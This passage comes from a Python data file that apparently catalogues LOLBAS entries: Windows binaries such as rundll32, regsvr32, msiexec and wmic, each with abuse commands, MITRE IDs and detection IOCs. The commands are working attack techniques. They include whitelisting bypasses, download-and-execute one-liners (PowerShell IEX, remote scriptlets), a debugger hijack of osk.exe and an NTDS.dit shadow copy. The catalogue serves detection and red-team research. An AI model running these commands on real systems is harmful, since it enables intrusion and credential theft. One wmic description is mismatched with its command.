                    "Usecase": "Execute code from remote scriptlet, bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1117",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regsvr32.exe /s /u /i:file.sct scrobj.dll",
                    "Description": "Execute the specified local .SCT script with scrobj.dll.",
                    "Usecase": "Execute code from scriptlet, bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "User",
                    "MitreID": "T1117",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll",
                    "Description": "Execute the specified remote .SCT script with scrobj.dll.",
                    "Usecase": "Execute code from remote scriptlet, bypass Application whitelisting",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1117",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regsvr32.exe /s /u /i:file.sct scrobj.dll",
                    "Description": "Execute the specified local .SCT script with scrobj.dll.",
                    "Usecase": "Execute code from scriptlet, bypass Application whitelisting",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1117",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\regsvr32.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\regsvr32.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "regsvr32.exe getting files from Internet"},
                {"IOC": "regsvr32.exe executing scriptlet files"},
            ],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "regsvr32",
        },
        {
            "Name": "Msiexec.exe",
            "Description": "Used by Windows to execute msi files",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "msiexec /quiet /i cmd.msi",
                    "Description": "Installs the target .MSI file silently.",
                    "Usecase": "Execute custom made msi file with attack code",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "msiexec /q /i http://192.168.100.3/tmp/cmd.png",
                    "Description": "Installs the target remote & renamed .MSI file silently.",
                    "Usecase": "Execute custom made msi file with attack code from remote server",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'msiexec /y "C:\\folder\\evil.dll"',
                    "Description": "Calls DLLRegisterServer to register the target DLL.",
                    "Usecase": "Execute dll files",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'msiexec /z "C:\\folder\\evil.dll"',
                    "Description": "Calls DLLRegisterServer to un-register the target DLL.",
                    "Usecase": "Execute dll files",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\msiexec.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\msiexec.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "msiexec.exe getting files from Internet"}],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/"
                },
                {
                    "Link": "https://twitter.com/PhilipTsukerman/status/992021361106268161"
                },
            ],
            "Acknowledgement": [
                {"Person": "netbiosX", "Handle": "AT_SYMBOLnetbiosX"},
                {"Person": "Philip Tsukerman", "Handle": "AT_SYMBOLPhilipTsukerman"},
            ],
            "pname": "msiexec",
        },
        {
            "Name": "Extrac32.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe",
                    "Description": "Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.",
                    "Usecase": "Extract data from cab file and hide it in an alternate data stream.",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "extrac32 \\\\webdavserver\\webdav\\file.cab c:\\ADS\\file.txt:file.exe",
                    "Description": "Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.",
                    "Usecase": "Extract data from cab file and hide it in an alternate data stream.",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt",
                    "Description": "Copy the source file to the destination file and overwrite it.",
                    "Usecase": "Download file from UNC/WEBDav",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe",
                    "Description": "Command for copying calc.exe to another folder",
                    "Usecase": "Copy file",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\extrac32.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\extrac32.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/"
                },
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                },
                {"Link": "https://twitter.com/egre55/status/985994639202283520"},
            ],
            "Acknowledgement": [
                {"Person": "egre55", "Handle": "AT_SYMBOLegre55"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "Hai Vaknin(Lux", "Handle": "AT_SYMBOLVakninHai"},
                {"Person": "Tamir Yehuda", "Handle": "AT_SYMBOLtim8288"},
            ],
            "pname": "extrac32",
        },
        {
            "Name": "wuauclt.exe",
            "Description": "Windows Update Client",
            "Author": "David Middlehurst",
            "Created": "2020-09-23",
            "Commands": [
                {
                    "Command": "wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer",
                    "Description": "Full_Path_To_DLL would be the abosolute path to .DLL file and would execute code on attach.",
                    "Usecase": "Execute dll via attach/detach methods",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\wuauclt.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "wuauclt run with a parameter of a DLL path"}],
            "Resources": [{"Link": "https://dtm.uk/wuauclt/"}],
            "Acknowledgement": [
                {"Person": "David Middlehurst", "Handle": "AT_SYMBOLdtmsecurity"}
            ],
            "pname": "wuauclt",
        },
        {
            "Name": "Regini.exe",
            "Description": "Used to manipulate the registry",
            "Author": "Oddvar Moe",
            "Created": "2020-07-03",
            "Commands": [
                {
                    "Command": "regini.exe newfile.txt:hidden.ini",
                    "Description": "Write registry keys from data inside the Alternate data stream.",
                    "Usecase": "Write to registry",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\regini.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\regini.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "regini.exe reading from ADS"}],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                }
            ],
            "Acknowledgement": [
                {"Person": "Eli Salem", "Handle": "AT_SYMBOLelisalem9"}
            ],
            "pname": "regini",
        },
        {
            "Name": "Psr.exe",
            "Description": "Windows Problem Steps Recorder, used to record screen and clicks.",
            "Author": "Leon Rodenko",
            "Created": "2020-06-27",
            "Commands": [
                {
                    "Command": "psr.exe /start /output D:\\test.zip /sc 1 /gui 0",
                    "Description": 'Record a user screen without creating a GUI. You should use "psr.exe /stop" to stop recording and create output file.',
                    "Usecase": "Can be used to take screenshots of the user environment",
                    "Category": "Reconnaissance",
                    "Privileges": "User",
                    "MitreID": "T1113",
                    "MitreLink": "https://attack.mitre.org/techniques/T1113/",
                    "OperatingSystem": "since Windows 7 (client) / Windows 2008 R2",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\psr.exe"},
                {"Path": "c:\\windows\\syswow64\\psr.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "psr.exe spawned"},
                {"IOC": 'suspicious activity when running with "/gui 0" flag'},
            ],
            "Resources": [
                {
                    "Link": "https://social.technet.microsoft.com/wiki/contents/articles/51722.windows-problem-steps-recorder-psr-quick-and-easy-documenting-of-your-steps-and-procedures.aspx"
                }
            ],
            "Acknowledgement": [
                {"Person": "Leon Rodenko", "Handle": "AT_SYMBOLL3m0nada"}
            ],
            "pname": "psr",
        },
        {
            "Name": "Rundll32.exe",
            "Description": "Used by Windows to execute dll files",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe AllTheThingsx64,EntryPoint",
                    "Description": "AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.",
                    "Usecase": "Execute dll file",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "rundll32.exe \\\\10.10.10.10\\share\\payload.dll,EntryPoint",
                    "Description": "Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.",
                    "Usecase": "Execute DLL from SMB share.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/techniques/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(\'http://ip:port/\');"',
                    "Description": "Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.",
                    "Usecase": "Execute code from Internet",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'rundll32.exe javascript:"\\..\\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\\"WScript.Shell\\");w.run(\\"calc\\");window.close()");',
                    "Description": "Use Rundll32.exe to execute a JavaScript script that runs calc.exe.",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}',
                    "Description": "Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")',
                    "Description": "Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.",
                    "Usecase": "Execute code from Internet",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'rundll32 "C:\\ads\\file.txt:ADSDLL.dll",DllMain',
                    "Description": "Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).",
                    "Usecase": "Execute code from alternate data stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "rundll32.exe -sta {CLSID}",
                    "Description": "Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.",
                    "Usecase": "Execute a DLL/EXE COM server payload or ScriptletURL code.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": None,
                    "MitreLink": None,
                    "OperatingSystem": "Windows 10 (and likely previous versions)",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\rundll32.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\rundll32.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/"
                },
                {
                    "Link": "https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
                {
                    "Link": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/"
                },
                {
                    "Link": "https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/"
                },
                {"Link": "https://github.com/sailay1996/expl-bin/blob/master/obfus.md"},
                {
                    "Link": "https://github.com/sailay1996/misc-bin/blob/master/rundll32.md"
                },
            ],
            "Acknowledgement": [
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Sailay", "Handle": "AT_SYMBOL404death"},
                {"Person": "Martin Ingesen", "Handle": "AT_SYMBOLMrtn9"},
            ],
            "pname": "rundll32",
        },
        {
            "Name": "Wscript.exe",
            "Description": "Used by Windows to execute scripts",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "wscript c:\\ads\\file.txt:script.vbs",
                    "Description": "Execute script stored in an alternate data stream",
                    "Usecase": "Execute hidden code to evade defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\\test.txt:hi.js && wscript.exe %temp%\\test.txt:hi.js',
                    "Description": "Download and execute script stored in an alternate data stream",
                    "Usecase": "Execute hidden code to evade defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\wscript.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\wscript.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Wscript.exe executing code from alternate data streams"}
            ],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "SaiLay(valen)", "Handle": "AT_SYMBOL404death"},
            ],
            "pname": "wscript",
        },
        {
            "Name": "Cmdkey.exe",
            "Description": "creates, lists, and deletes stored user names and passwords or credentials.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "cmdkey /list",
                    "Description": "List cached credentials",
                    "Usecase": "Get credential information from host",
                    "Category": "Credentials",
                    "Privileges": "User",
                    "MitreID": "T1078",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1078",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\cmdkey.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\cmdkey.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Usage of this command could be an IOC"}],
            "Resources": [
                {
                    "Link": "https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey"
                },
            ],
            "Acknowledgement": [{"Person": None, "Handle": None}],
            "pname": "cmdkey",
        },
        {
            "Name": "Reg.exe",
            "Description": "Used to manipulate the registry",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg",
                    "Description": "Export the target Registry key and save it to the specified .REG file within an Alternate data stream.",
                    "Usecase": "Hide/plant registry information in Alternate data stream for later use",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\reg.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\reg.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "reg.exe writing to an ADS"}],
            "Resources": [
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                }
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "reg",
        },
        {
            "Name": "Wab.exe",
            "Description": "Windows address book manager",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "wab.exe",
                    "Description": "Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice",
                    "Usecase": "Execute dll file. Bypass defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Program Files\\Windows Mail\\wab.exe"},
                {"Path": "C:\\Program Files (x86)\\Windows Mail\\wab.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "WAB.exe should normally never be used"}],
            "Resources": [
                {"Link": "https://twitter.com/Hexacorn/status/991447379864932352"},
                {
                    "Link": "http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/"
                },
            ],
            "Acknowledgement": [{"Person": "Adam", "Handle": "AT_SYMBOLHexacorn"}],
            "pname": "wab",
        },
        {
            "Name": "Wmic.exe",
            "Description": "The WMI command-line (WMIC) utility provides a command-line interface for WMI",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'wmic.exe process call create "c:\\ads\\file.txt:program.exe"',
                    "Description": "Execute a .EXE file stored as an Alternate Data Stream (ADS)",
                    "Usecase": "Execute binary file hidden in Alternate data streams to evade defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "wmic.exe process call create calc",
                    "Description": "Execute calc from wmic",
                    "Usecase": "Execute binary from wmic to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe process call create "C:\\Windows\\system32\\reg.exe add \\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\" /v \\"Debugger\\" /t REG_SZ /d \\"cmd.exe\\" /f"',
                    "Description": "Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.",
                    "Usecase": "Execute binary by manipulate the debugger for a program to evade defensive counter measures",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe /node:"192.168.0.1" process call create "evil.exe"',
                    "Description": "Execute evil.exe on the remote system.",
                    "Usecase": "Execute binary on a remote system",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt"',
                    "Description": "Create a scheduled execution of C:\\GoogleUpdate.exe to run at 9pm.",
                    "Usecase": "Execute binary with scheduled task created with wmic on a remote computer",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit"',
                    "Description": "Create a volume shadow copy of NTDS.dit that can be copied.",
                    "Usecase": "Execute binary on remote system",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"',
                    "Description": "Create a volume shadow copy of NTDS.dit that can be copied.",
                    "Usecase": "Execute binary on remote system",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'wmic.exe process get brief /format:"\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl"',
                    "Description": "Executes JScript or VBScript embedded in the target remote XSL stylsheet.",
                    "Usecase": "Execute script from remote system",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\wbem\\wmic.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\wbem\\wmic.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Wmic getting scripts from remote system"}],
            "Resources": [
                {
                    "Link": "https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory"
                },
                {
                    "Link": "https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html"
                },
                {"Link": "https://twitter.com/subTee/status/986234811944648707"},
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "wmic",
        },
        {
            "Name": "Dnscmd.exe",
            "Description": "A command-line interface for managing DNS servers",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll",
                    "Description": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.",
                    "Usecase": "Remotly inject dll to dns server",
                    "Category": "Execute",
                    "Privileges": "DNS admin",
                    "MitreID": "T1035",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1035",
                    "OperatingSystem": "Windows server",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Dnscmd.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Dnscmd.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Dnscmd.exe loading dll from UNC path"}],
            "Resources": [
                {
                    "Link": "https://medium.com/AT_SYMBOLesnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"
                },
                {
                    "Link": "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
                },
                {
                    "Link": "https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp"
                },
                {"Link": "https://twitter.com/Hexacorn/status/994000792628719618"},
                {
                    "Link": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
                },
            ],
            "Acknowledgement": [
                {"Person": "Shay Ber", "Handle": None},
                {"Person": "Dimitrios Slamaris", "Handle": "AT_SYMBOLdim0x69"},
                {"Person": "Nikhil SamratAshok", "Handle": "AT_SYMBOLnikhil_mitt"},
            ],
            "pname": "dnscmd",
        },
        {
            "Name": "Regasm.exe",
            "Description": "Part of .NET",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "regasm.exe AllTheThingsx64.dll",
                    "Description": "Loads the target .DLL file and executes the RegisterClass function.",
                    "Usecase": "Execute code and bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "Local Admin",
                    "MitreID": "T1121",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regasm.exe /U AllTheThingsx64.dll",
                    "Description": "Loads the target .DLL file and executes the UnRegisterClass function.",
                    "Usecase": "Execute code and bypass Application whitelisting",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1121",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe"
                },
                {
